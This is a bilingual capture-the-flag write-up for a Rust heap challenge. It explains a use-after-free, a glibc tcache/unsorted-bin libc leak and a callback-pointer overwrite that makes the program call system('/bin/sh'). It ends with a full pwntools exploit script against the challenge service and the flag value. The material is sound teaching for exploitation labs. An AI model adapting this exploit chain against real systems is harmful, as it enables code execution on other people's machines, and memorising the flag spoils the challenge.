# Unsound Memories -- Flag 2

## Write-up (FR)

### Prérequis

Ce write-up suppose que le Flag 1 a été obtenu : `admin[0].is_admin == 1`.
La vulnérabilité Use-After-Free et le mécanisme de `alloc_ref()` ont déjà été analysés.

### Exploration : nouvelles commandes disponibles

Une fois `is_admin == 1`, le menu affiche de nouvelles options :

```
10) Drop admin
```

En lisant `lib.rs`, `admin_drop` libère le `Box<AdminRecord>` :

```rs
pub fn admin_drop(&mut self, index: usize) -> Result<(), Error> {
    match self.admins.get(index) {
        Some(Some(admin)) if admin.is_admin == 1 => {}
        Some(Some(_)) => return Err(Error::Deleted),
        ...
    }
    *self.admins.get_mut(index).unwrap() = None;
    Ok(())
}
```

Cette commande libère l'objet en mémoire. La référence danglante `ref[0]` pointe
toujours vers cet emplacement -- tout ce que glibc y écrit devient lisible via `show_ref`.

On examine aussi `admin_show` :

```rs
pub fn admin_show<W: Write>(&self, index: usize, w: &mut W) -> Result<(), Error> {
    match self.admins.get(index) {
        Some(Some(admin)) => {
            writeln!(w, "Is admin : {}", admin.is_admin)?;
            if let Some(cb) = admin.callback {
                cb(&**admin as *const AdminRecord as *const u8);
            }
            Ok(())
        }
        ...
    }
}
```

Si `admin.callback` est non-nul, il est **appelé comme une fonction**. Et
`AdminRecord` est défini ainsi :

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,                    // offset  0
    callback: Option<fn(*const u8)>,  // offset  8
    username: [u8; BUFFER_SIZE - 16], // offset 16
}
```

Le champ `callback` est un pointeur de fonction. Si on peut contrôler sa valeur,
on contrôle le flot d'exécution du programme.

L'objectif devient :

> Écrire l'adresse d'une fonction utile dans `admin.callback`,
> puis appeler `admin_show` pour déclencher l'exécution.

### Étape 1 -- Comprendre l'allocateur glibc : le tcache

glibc gère un cache de chunks libérés appelé **tcache** (*thread-local cache*).
Pour chaque taille de chunk, il maintient une liste chaînée d'au maximum **7 entrées**.

Quand on libère un objet de taille 144 octets :
- glibc arrondit à 160 = `0xa0` octets (taille réelle avec en-tête)
- le chunk est ajouté en tête du tcache pour la taille `0xa0`
- `tcache[0xa0].count` passe de N à N+1

Quand on alloue un objet de même taille :
- si `count > 0`, glibc retourne le chunk en tête du tcache
- `count` décrémente

**Quand le tcache est plein (count = 7)** et qu'un nouveau chunk est libéré,
glibc ne peut pas le mettre en tcache. Il va dans l'**unsorted bin** à la place.

### Étape 2 -- L'unsorted bin : une fuite vers libc

L'unsorted bin est une liste doublement chaînée gérée directement par glibc.
Son pointeur de tête se trouve dans une structure appelée `main_arena`, qui vit
dans la mémoire de `libc.so.6`.

Quand un chunk X est placé en tête d'un unsorted bin vide :

```
X.user[0:8]  = fd = &unsorted_bin_head  (pointeur dans libc)
X.user[8:16] = bk = &unsorted_bin_head  (même valeur)
```

Le chunk contient donc un pointeur directement dans `libc`. Si on peut lire ce
pointeur via `show_ref`, on peut calculer l'adresse de base de `libc`.

### Étape 3 -- Préparer le tcache plein pour forcer A dans l'unsorted bin

On veut libérer `admin[0]` (= chunk A) en unsorted bin. Pour ça, il faut que
`tcache[0xa0]` soit plein (count = 7) au moment du `admin_drop`.

**Séquence :**

1. Créer `ref[1]` -> `alloc_ref()` alloue B puis le libère -> `tcache[1]`
2. `new_log()` × 1 -> prend B du tcache -> `log[0]` est maintenant au même endroit que B
3. `new_log()` × 6 -> alloue C, D, E, F, G, H -> `logs[1–6]`
4. `drop_log(i)` pour i = 0..6 -> B, C, D, E, F, G, H -> `tcache[count=7]`
5. `admin_drop(0)` -> tcache plein -> **chunk A va dans l'unsorted bin**
6. `show_ref(0)` -> lit `A.user[0:8]` = pointeur dans `main_arena`

### Étape 4 -- Calculer `libc_base` depuis le pointeur lu

Le pointeur lu vaut :

```
fd = libc_base + MAIN_ARENA_OFF + UNSORTED_OFF
```

Donc :

```
libc_base = fd - MAIN_ARENA_OFF - UNSORTED_OFF
```

avec `UNSORTED_OFF = 96` (offset fixe de l'unsorted bin head dans `main_arena`).

Il reste à trouver `MAIN_ARENA_OFF`.

### Étape 5 -- Mesurer `MAIN_ARENA_OFF` par désassemblage

`main_arena` est une variable globale interne à glibc. Elle n'est pas exportée
dans la table des symboles de `libc.so.6`, mais on peut la localiser par
désassemblage.

La fonction `malloc_trim` y accède en premier. On la désassemble avec `objdump` :

```bash
objdump -d libc.so.6 | grep -A 30 "<malloc_trim>"
```

On cherche la première instruction `lea rdi, [rip+X]` ou `lea rax, [rip+X]`
qui charge l'adresse de `main_arena`. La valeur `X` est le décalage relatif par
rapport à l'instruction suivante.

```
offset_instruction + taille_instruction + X = MAIN_ARENA_OFF
```

Alternativement, avec `pwntools` :

```python
from pwn import *
libc = ELF("libc.so.6")
data = libc.read(0, len(libc.data) + 0x100000)

# Chercher "malloc_trim" dans les symboles
trim_off = libc.symbols["malloc_trim"]

# Désassembler les premiers octets
for insn in disasm(libc.read(trim_off, 80), vma=trim_off).split("\n"):
    if "lea" in insn and "rip" in insn:
        print(insn)
        break
```

Sur Ubuntu 22.04 avec glibc 2.35 :

```
MAIN_ARENA_OFF = 0x21ac80
UNSORTED_OFF   = 96
```

**Vérification** : `libc_base` doit être aligné sur `0x1000` (une page mémoire).
Si ce n'est pas le cas, les offsets sont incorrects.

### Étape 6 -- Trouver `system()` et la chaîne `/bin/sh`

`system()` est exportée dans `libc.so.6` et est accessible directement :

```python
libc = ELF("libc.so.6")
libc.address = libc_base

SYSTEM = libc.address + libc.symbols["system"]
BINSH  = libc.address + next(libc.search(b"/bin/sh\x00"))
```

### Étape 7 -- Recréer l'aliasing (même mécanisme que Flag 1)

On veut que `ref[2]` et `admin[1]` pointent vers le même chunk A, exactement
comme au Flag 1 avec `ref[0]` et `admin[0]`.

**Séquence :**

1. Vider le tcache : `new_log()` × 7 -> prend H, G, F, E, D, C, B -> tcache vide
2. `new_ref()` -> `alloc_ref()` : glibc prend A dans l'unsorted bin, Box le zéroïse,
   le libère -> A repart dans `tcache[1]`. `ref[2] = &A`
3. `new_admin()` -> `Box::new(AdminRecord{...})` : glibc prend A du tcache -> `admin[1]`
   est à la même adresse que A. **`ref[2]` et `admin[1]` aliasent le même chunk.**

### Étape 8 -- Écraser `callback` via `edit_ref`

La disposition mémoire de `AdminRecord` (`#[repr(C)]`) est connue :

```
offset  0 : is_admin  (u64, 8 octets)
offset  8 : callback  (Option<fn(*const u8)>, 8 octets)
offset 16 : username  ([u8; 128])
```

`Option<fn(*const u8)>` utilise l'optimisation *null pointer* de Rust :
`None` = 0 en mémoire, `Some(f)` = valeur de `f` (non-nulle).

On écrit via `edit_ref(2, ...)` :

```python
payload = b'/bin/sh\x00' + p64(SYSTEM)
#          ^ is_admin (8 octets) : "/bin/sh\0" comme entier
#                      ^ callback : adresse de system()
edit_ref(p, 2, payload)
```

En mémoire :
```
A_user + 0 : 2f 62 69 6e 2f 73 68 00   ← is_admin = valeur numérique de "/bin/sh\0"
A_user + 8 : <adresse de system()>      ← callback = Some(system)
```

`is_admin` prend une valeur non nulle mais != 1 -- la commande `Get flag` ne
fonctionnera plus, mais `admin_show` ne vérifie pas `is_admin` avant d'appeler
`callback`.

### Étape 9 -- Déclencher le callback

`admin_show(1)` appelle :

```rs
cb(&**admin as *const AdminRecord as *const u8);
```

Ce qui se traduit en assembleur par quelque chose comme :

```asm
lea rdi, [A_user]   ; rdi = pointeur vers A_user = pointeur vers "/bin/sh\0"
call [callback]     ; call system
```

`system(rdi)` reçoit donc `A_user` comme argument, qui pointe vers la chaîne
`"/bin/sh\0"` qu'on vient d'écrire. `system("/bin/sh")` lance un shell.

### Étape 10 -- Récupérer le flag

Depuis le shell :

```bash
cat /flag
```

### Récapitulatif de la chaîne complète

```
ref_new()                       -> ref[0]=&A, A en tcache
admin_new()                     -> admin[0] at A (aliasé)      ← Flag 1
edit_ref(0, p64(1))             -> is_admin=1
get_flag(0)                     -> FLAG 1 ✓

ref_new()                       -> ref[1]=&B, B en tcache
new_log() ×7                    -> log[0] prend B, logs 1-6 frais
drop_log(0..6)                  -> tcache[count=7, FULL]
drop_admin(0)                   -> A en unsorted bin
show_ref(0)                     -> fd = main_arena+X -> libc_base ✓

new_log() ×7                    -> vide le tcache
new_ref()                       -> ref[2]=&A (A retourne en tcache)
new_admin()                     -> admin[1] at A (aliasé avec ref[2])
edit_ref(2, /bin/sh + system)   -> écrase callback
admin_show(1)                   -> system("/bin/sh") -> shell
cat /flag                       -> FLAG 2 ✓
```

## Write-up (EN)

### Prerequisites

This write-up assumes Flag 1 has already been obtained: `admin[0].is_admin == 1`.
The Use-After-Free vulnerability and `alloc_ref()` mechanism have already been analysed.

### Exploration: new commands

Once `is_admin == 1`, the menu shows a new option:

```
10) Drop admin
```

Reading `lib.rs`, `admin_drop` frees the `Box<AdminRecord>`:

```rs
pub fn admin_drop(&mut self, index: usize) -> Result<(), Error> {
    match self.admins.get(index) {
        Some(Some(admin)) if admin.is_admin == 1 => {}
        Some(Some(_)) => return Err(Error::Deleted),
        ...
    }
    *self.admins.get_mut(index).unwrap() = None;
    Ok(())
}
```

This frees the object in memory. The dangling reference `ref[0]` still points
at that location -- whatever glibc writes there becomes readable via `show_ref`.

We also examine `admin_show`:

```rs
if let Some(cb) = admin.callback {
    cb(&**admin as *const AdminRecord as *const u8);
}
```

If `admin.callback` is non-null, it is **called as a function**.
`AdminRecord` is laid out as:

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,                    // offset  0
    callback: Option<fn(*const u8)>,  // offset  8
    username: [u8; BUFFER_SIZE - 16], // offset 16
}
```

The `callback` field is a function pointer. Controlling its value means
controlling the program's execution flow.

The goal becomes:

> Write the address of a useful function into `admin.callback`,
> then call `admin_show` to trigger execution.

### Step 1 -- Understanding glibc's tcache

glibc maintains a per-thread cache of freed chunks called the **tcache**.
For each chunk size, it holds a singly-linked list of at most **7 entries**.

When an object of 144 bytes is freed:
- glibc rounds up to 160 = `0xa0` bytes (actual size including the header)
- the chunk is prepended to the tcache list for size `0xa0`
- `tcache[0xa0].count` increases from N to N+1

When an object of the same size is allocated:
- if `count > 0`, glibc returns the head of the tcache list
- `count` decrements

**When the tcache is full (count = 7)** and another chunk is freed,
glibc cannot place it in the tcache, so it goes to the **unsorted bin** instead.

### Step 2 -- The unsorted bin: a leak into libc

The unsorted bin is a doubly-linked list managed directly by glibc.
Its head pointer lives inside a structure called `main_arena`, which resides
inside `libc.so.6`'s memory.

When chunk X is placed at the head of an empty unsorted bin:

```
X.user[0:8]  = fd = &unsorted_bin_head  (pointer into libc)
X.user[8:16] = bk = &unsorted_bin_head  (same value)
```

The chunk now contains a pointer directly into `libc`. Reading it via `show_ref`
allows us to compute `libc`'s base address.

### Step 3 -- Filling the tcache to force A into the unsorted bin

We want to free `admin[0]` (= chunk A) into the unsorted bin. This requires
`tcache[0xa0]` to be full (count = 7) at the time of `admin_drop`.

**Sequence:**

1. Create `ref[1]` -> `alloc_ref()` allocates B then frees it -> `tcache[1]`
2. `new_log()` × 1 -> takes B from tcache -> `log[0]` overlaps with B
3. `new_log()` × 6 -> allocates C, D, E, F, G, H -> `logs[1–6]`
4. `drop_log(i)` for i = 0..6 -> B, C, D, E, F, G, H -> `tcache[count=7]`
5. `admin_drop(0)` -> tcache full -> **chunk A goes to the unsorted bin**
6. `show_ref(0)` -> reads `A.user[0:8]` = pointer into `main_arena`

### Step 4 -- Computing `libc_base` from the leaked pointer

The leaked pointer equals:

```
fd = libc_base + MAIN_ARENA_OFF + UNSORTED_OFF
```

Therefore:

```
libc_base = fd - MAIN_ARENA_OFF - UNSORTED_OFF
```

with `UNSORTED_OFF = 96` (fixed offset of the unsorted bin head inside `main_arena`).

We still need to find `MAIN_ARENA_OFF`.

### Step 5 -- Measuring `MAIN_ARENA_OFF` by disassembly

`main_arena` is a glibc-internal global variable. It is not exported in
`libc.so.6`'s symbol table, but can be located by disassembly.

`malloc_trim` accesses it first. We disassemble it with `objdump`:

```bash
objdump -d libc.so.6 | grep -A 30 "<malloc_trim>"
```

We look for the first `lea rdi, [rip+X]` instruction that loads `main_arena`'s
address. The value `X` is the relative offset from the next instruction:

```
offset_of_next_instruction + X = MAIN_ARENA_OFF
```

With `pwntools`:

```python
from pwn import *
libc = ELF("libc.so.6")
trim_off = libc.symbols["malloc_trim"]
print(disasm(libc.read(trim_off, 80), vma=trim_off))
```

On Ubuntu 22.04 / glibc 2.35:

```
MAIN_ARENA_OFF = 0x21ac80
UNSORTED_OFF   = 96
```

**Verification**: `libc_base` must be page-aligned (`% 0x1000 == 0`).
If not, the offsets are wrong.

### Step 6 -- Finding `system()` and `/bin/sh`

`system()` is exported by `libc.so.6`:

```python
libc = ELF("libc.so.6")
libc.address = libc_base

SYSTEM = libc.address + libc.symbols["system"]
BINSH  = libc.address + next(libc.search(b"/bin/sh\x00"))
```

### Step 7 -- Re-creating the alias (same mechanism as Flag 1)

We want `ref[2]` and `admin[1]` to point to the same chunk A, exactly
like `ref[0]` and `admin[0]` in Flag 1.

**Sequence:**

1. Drain tcache: `new_log()` × 7 -> takes H, G, F, E, D, C, B -> tcache empty
2. `new_ref()` -> `alloc_ref()`: glibc takes A from the unsorted bin, Box zeroes it,
   drops it -> A goes back to `tcache[1]`. `ref[2] = &A`
3. `new_admin()` -> `Box::new(AdminRecord{...})`: glibc takes A from tcache -> `admin[1]`
   lives at the same address as A. **`ref[2]` and `admin[1]` alias the same chunk.**

### Step 8 -- Overwriting `callback` via `edit_ref`

The `AdminRecord` layout (`#[repr(C)]`) is predictable:

```
offset  0 : is_admin  (u64, 8 bytes)
offset  8 : callback  (Option<fn(*const u8)>, 8 bytes)
offset 16 : username  ([u8; 128])
```

`Option<fn(*const u8)>` uses Rust's null pointer optimisation:
`None` = 0 in memory, `Some(f)` = the value of `f` (non-zero).

We write via `edit_ref(2, ...)`:

```python
payload = b'/bin/sh\x00' + p64(SYSTEM)
#          ^ is_admin (8 bytes): "/bin/sh\0" as an integer
#                      ^ callback: address of system()
edit_ref(p, 2, payload)
```

In memory:
```
A_user + 0 : 2f 62 69 6e 2f 73 68 00   ← is_admin = numeric value of "/bin/sh\0"
A_user + 8 : <address of system()>      ← callback = Some(system)
```

### Step 9 -- Triggering the callback

`admin_show(1)` executes:

```rs
cb(&**admin as *const AdminRecord as *const u8);
```

In assembly this translates to roughly:

```asm
lea rdi, [A_user]   ; rdi = pointer to A_user = pointer to "/bin/sh\0"
call [callback]     ; call system
```

`system(rdi)` receives `A_user` as its argument, which points to the
`"/bin/sh\0"` string we just wrote. `system("/bin/sh")` spawns a shell.

### Step 10 -- Reading the flag

From the shell:

```bash
cat /flag
```

## Exploit

```python
#!/usr/bin/env python3
"""
solve_flag2.py -- NanoLog : libc leak + callback hijack
DCI Summer Camp 2026
"""
import os
from pwn import *

HOST = os.getenv("TARGET_HOST", "127.0.0.1")
PORT = int(os.getenv("TARGET_PORT", "1337"))
LIBC = os.getenv("LIBC", "./libc.so.6")

# Offsets mesurés sur la libc.so.6 fournie (Ubuntu 22.04, glibc 2.35)
# Méthode : objdump -d libc.so.6 | grep -A 30 "<malloc_trim>"
#           -> premier LEA RDI, [RIP+X] : MAIN_ARENA_OFF = addr_suivante + X
MAIN_ARENA_OFF = 0x21ac80
UNSORTED_OFF   = 96         # offset fixe de l'unsorted bin head dans main_arena

context.arch      = "amd64"
context.log_level = "info"

libc = ELF(LIBC, checksec=False)

# == Helpers protocole =========================================================

def parse_hexdump(raw):
    data = b""
    for line in raw.split(b"\n"):
        if b"|" not in line:
            continue
        for tok in line.split(b"|")[0].split()[1:]:
            try:
                data += bytes([int(tok, 16)])
            except ValueError:
                pass
    return data

def new_log(p):
    p.sendlineafter(b"> ", b"1")
    p.recvuntil(b"Created log #")
    return int(p.recvline().strip())

def drop_log(p, i):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.recvline()

def new_ref(p):
    p.sendlineafter(b"> ", b"5")
    p.recvuntil(b"Created ref #")
    return int(p.recvline().strip())

def show_ref(p, i):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    return parse_hexdump(b"".join(p.recvline() for _ in range(9)))

def edit_ref(p, i, data):
    p.sendlineafter(b"> ", b"7")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.sendlineafter(b"Enter data (hex): ", str(len(data)).encode())
    p.send(data)
    p.sendline(b"")
    p.recvline()

def new_admin(p):
    p.sendlineafter(b"> ", b"8")
    p.recvuntil(b"Created admin #")
    return int(p.recvline().strip())

def drop_admin(p, i):
    p.sendlineafter(b"> ", b"10")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.recvline()

def get_flag(p, i):
    p.sendlineafter(b"> ", b"11")
    p.sendlineafter(b"Enter index: ", str(i).encode())

# == Exploit ===================================================================

def exploit():
    p = remote(HOST, PORT)

    # == Flag 1 : UAF -> is_admin = 1 ==========================================
    log.info("Phase 1 : Flag 1 (UAF -> is_admin = 1)")

    new_ref(p)                          # ref[0] = &A  (A freed to tcache)
    A_user = u64(show_ref(p, 0)[:8]) << 12
    log.success(f"A_user = {hex(A_user)}")

    new_admin(p)                        # admin[0] takes A from tcache -> aliases ref[0]
    edit_ref(p, 0, p64(1))             # UAF write : is_admin = 1
    get_flag(p, 0)
    log.success(f"Flag 1 : {p.recvline().decode().strip()}")

    # == Phase 2 : heap leak + libc leak via unsorted bin =====================
    log.info("Phase 2 : libc leak")

    new_ref(p)                          # ref[1] = &B  (B freed to tcache)
    B_user = u64(show_ref(p, 1)[:8]) << 12
    log.success(f"B_user = {hex(B_user)}")

    new_log(p)                          # log[0] takes B from tcache
    for _ in range(6):
        new_log(p)                      # logs 1-6 : fresh chunks C-H

    for i in range(7):
        drop_log(p, i)                  # B-H -> tcache[count=7, FULL]

    drop_admin(p, 0)                    # tcache full -> A goes to unsorted bin

    fd = u64(show_ref(p, 0)[:8])       # A.user[0:8] = fd = main_arena + offset
    libc.address = fd - MAIN_ARENA_OFF - UNSORTED_OFF
    assert libc.address % 0x1000 == 0, f"libc_base non aligné : {hex(libc.address)}"
    log.success(f"libc_base = {hex(libc.address)}")

    SYSTEM = libc.address + libc.symbols["system"]
    BINSH  = libc.address + next(libc.search(b"/bin/sh\x00"))
    log.info(f"system   = {hex(SYSTEM)}")
    log.info(f"/bin/sh  = {hex(BINSH)}")

    # == Phase 3 : callback hijack =============================================
    log.info("Phase 3 : callback hijack -> shell")

    for _ in range(7):
        new_log(p)                      # drain tcache completely (7 allocs)

    # Reproduce the Flag-1 aliasing trick for admin[1] :
    # alloc_ref() takes A from unsorted bin -> zeroes it -> frees it -> tcache[1]
    new_ref(p)                          # ref[2] = &A
    # admin_new() takes A from tcache -> admin[1] aliases ref[2]
    new_admin(p)                        # admin[1] at A_user

    # Write "/bin/sh\0" at is_admin (offset 0) and system() at callback (offset 8)
    # admin_show will call: system(&admin[1]) = system("/bin/sh\0") -> shell
    edit_ref(p, 2, b'/bin/sh\x00' + p64(SYSTEM))
    log.success(f"admin[1].callback = system @ {hex(SYSTEM)}")

    # == Phase 4 : trigger =====================================================
    p.sendlineafter(b"> ", b"9")
    p.sendlineafter(b"Enter index: ", b"1")
    # Service prints "Is admin : <value>" then calls system("/bin/sh")
    p.recvuntil(b"Is admin")
    p.recvline()

    log.success("Shell obtained -- reading flag")
    p.sendline(b"cat /flag")
    flag2 = p.recvline(timeout=3).strip()
    log.success(f"FLAG 2 : {flag2.decode()}")

    p.interactive()

if __name__ == "__main__":
    exploit()
```

## Flag

`DCI{N4n0L0g_L1bc_L34k_DC4svjxQ}`
